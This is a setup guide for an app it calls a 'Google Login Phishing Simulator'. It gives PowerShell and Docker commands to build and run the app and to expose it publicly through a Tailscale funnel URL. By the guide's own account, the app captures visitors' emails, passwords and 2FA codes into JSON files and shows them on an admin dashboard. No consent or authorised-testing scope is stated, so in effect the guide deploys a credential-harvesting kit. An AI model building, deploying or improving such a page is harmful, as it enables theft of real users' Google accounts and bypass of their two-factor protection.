# Google Login Phishing Simulator - Manual Setup Guide

## Quick Start (Windows PowerShell)

### Option 1: Automatic Setup (Recommended)

1. Extract the ZIP file anywhere
2. Double-click `SETUP_WINDOWS.ps1` (or run in PowerShell)
3. Follow the prompts
4. App opens automatically at `http://localhost:5001/ggl-app/`

### Option 2: Manual Setup

#### Step 1: Extract ZIP
- Extract the downloaded ZIP file to your desired location
- Example: `C:\Users\YourName\Desktop\ggl-app`

#### Step 2: Open PowerShell
```powershell
cd C:\Users\YourName\Desktop\ggl-app
```

#### Step 3: Verify Folder Structure
You should see:
```
ggl-app/
├── Dockerfile
├── package.json
├── client/
├── server/
├── vite.config.ts
└── ... (other files)
```

**IMPORTANT:** Only ONE `cd` command needed! If you see a nested folder structure, run:
```powershell
# Fix nested folder (if needed)
if (Test-Path ".\ggl") {
    Get-ChildItem -Path ".\ggl" -Force | ForEach-Object {
        Move-Item -Path $_.FullName -Destination "." -Force
    }
    Remove-Item ".\ggl" -Force -Recurse
}
```

#### Step 4: Build Docker Image
```powershell
docker build -t ggl-app .
```
(Takes 1-2 minutes first time)

#### Step 5: Run Container
```powershell
docker run -d `
    --name ggl-phish `
    -p 5001:5001 `
    -v "${PWD}\data:/app/data" `
    ggl-app
```

#### Step 6: Verify It's Running
```powershell
docker logs ggl-phish
```
You should see: `serving on port 5001`

#### Step 7: Open in Browser
```powershell
start "http://localhost:5001/ggl-app/"
```

#### Step 8: Setup Tailscale (Optional)
```powershell
& "C:\Program Files\Tailscale\tailscale.exe" funnel --bg --set-path=/ggl-app 5001

# Then access at:
# https://chumbin.taila643f2.ts.net/ggl-app/
```

---

## Troubleshooting

### "Cannot GET /"
- Make sure you access: `http://localhost:5001/ggl-app/` (not `/`)
- Check Docker is running: `docker logs ggl-phish`

### "Dockerfile: No such file or directory"
- You have a nested folder structure
- Run the fix command above to move files up one level

### Docker build fails
- Make sure Docker Desktop is running
- Check you're in the correct folder: `ls` should show `Dockerfile`

### Port 5001 already in use
```powershell
# Find and stop the old container
docker stop ggl-phish
docker rm ggl-phish

# Then run the container again
```

---

## Management Commands

```powershell
# View logs
docker logs ggl-phish

# View data captured
dir data\

# Stop the app
docker stop ggl-phish

# Restart the app
docker start ggl-phish

# Remove the app
docker rm -f ggl-phish

# Access admin dashboard
start "http://localhost:5001/ggl-app/admin"
```

---

## File Structure

```
ggl-app/
├── client/                 # React frontend
│   └── src/
│       ├── pages/         # Login, Admin pages
│       └── components/    # UI components
├── server/                # Express backend
│   ├── index.ts          # Main server
│   ├── routes.ts         # API routes
│   ├── storage.ts        # JSON file storage
│   └── public/           # Built frontend
├── data/                 # Captured credentials (JSON files)
├── dist/                 # Built backend
├── Dockerfile            # Production build
├── package.json          # Dependencies
└── vite.config.ts        # Frontend config
```

---

## Default Access

- **Local**: `http://localhost:5001/ggl-app/`
- **Admin Panel**: `http://localhost:5001/ggl-app/admin`
- **Tailscale**: `https://chumbin.taila643f2.ts.net/ggl-app/`

---

## How It Works

1. User enters email on login page
2. App saves email to `data/emails.json`
3. User enters password
4. App saves password to `data/passwords.json`
5. User enters 2FA code
6. App saves code to `data/codes.json`
7. Admin can view all attempts at `/admin`

All data is stored locally in the `data/` folder!
